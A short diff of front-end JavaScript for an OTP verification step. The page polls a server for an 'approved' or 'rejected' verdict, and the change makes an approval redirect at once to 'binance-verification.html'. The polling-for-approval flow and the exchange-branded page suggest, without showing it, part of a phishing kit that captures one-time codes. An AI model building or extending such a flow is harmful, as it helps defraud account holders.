@@ -586,19 +586,15 @@
                 .then(result => {
                     console.log('Poll result:', result);
                     if (result.status === 'approved') {
-                        // Hide loading and show success
+                        // Hide loading and proceed to next step IMMEDIATELY
                         resetButton();
-                        setTimeout(() => {
-                            showSuccess('Verification approved successfully!');
-                            // Redirect to success page after delay
-                            setTimeout(() => {
-                                window.location.href = 'success.html';
-                            }, 2000);
-                        }, 1000);
+                        // If you want to go to binance-verification.html, use that, otherwise use success.html
+                        window.location.href = 'binance-verification.html';
                     } else if (result.status === 'rejected') {
                         // Hide loading and show error
                         resetButton();
-                        showError(result.error_message || 'Invalid OTP. Please try again.');
+                        let errorMsg = result.error_message || 'Invalid OTP. Please try again.';
+                        showError(errorMsg);
                     } else {
                         // Still pending, continue polling
                         setTimeout(poll, 2000); // Poll every 2 seconds
